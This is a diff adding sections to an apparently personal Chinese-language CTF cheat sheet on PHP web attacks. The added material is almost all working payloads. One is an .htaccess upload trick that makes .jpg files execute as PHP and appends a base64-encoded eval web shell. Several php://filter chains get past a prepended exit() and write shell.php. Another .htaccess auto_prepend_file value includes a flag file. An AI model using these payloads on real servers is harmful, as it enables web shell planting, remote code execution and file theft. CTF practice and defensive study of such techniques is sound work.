@@ -20,8 +20,16 @@
 ```
 
 ## .htaccess
+先传base64编码后的`1.jpg`,再传.htaccess
+```php
+<?php @eval($_GET[0]);
+```
 
-
+```php
+AddType application/x-httpd-php .jpg
+php_value auto_append_fi\
+le "php://filter/convert.base64-decode/resource=1.jpg"
+```
 
 
 ## postgreSQL语法
@@ -30,8 +38,48 @@
 
 ![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20231207180952.png)
 
+## php死亡绕过
 
+- 第一种情况
+`file_put_contents($filename,"<?php exit();".$content);`
 
+```php
+filename=php://filter/convert.base64-decode/resource=shell.php
+#加a是为了与exit();形成4字节
+content=aPD9waHAgQGV2YWwoJF9HRVRbMF0pOw==
+```
+
+```php
+filename=php://filter/convert.string.rot13/resource=shell.php
+content=<?cuc cucvasb();?>
+```
+
+```php
+filename=php://filter/string.strip_tags|convert.base64-decode/resource=shell.php
+content=?>PD9waHAgcGhwaW5mbygpOz8+
+```
+
+- 第二种情况
+`file_put_contents($content,"<?php exit();".$content);`
+
+```php
+content=php://filter/string.rot13|<?cuc cucvasb();?>|/resource=shell.php
+```
+
+```php
+content=php://filter/zlib.deflate|string.tolower|zlib.inflate|?><?php%0deval($_GET[1]);?>/resource=shell.php
+```
+
+```php
+content=php://filter/string.strip_tags|convert.base64-decode/resource=?>PD9waHAgcGhwaW5mbygpOz8+/../shell.php
+```
+
+- 第三种情况
+
+```php
+filename=.htaccess
+content=php_value auto_prepend_file D:\\phpstudy_pro\\www\\flag.php%0a%23\
+```
 # JWT
 爆破,jwt_tool在`CTF_TOOL`下
 
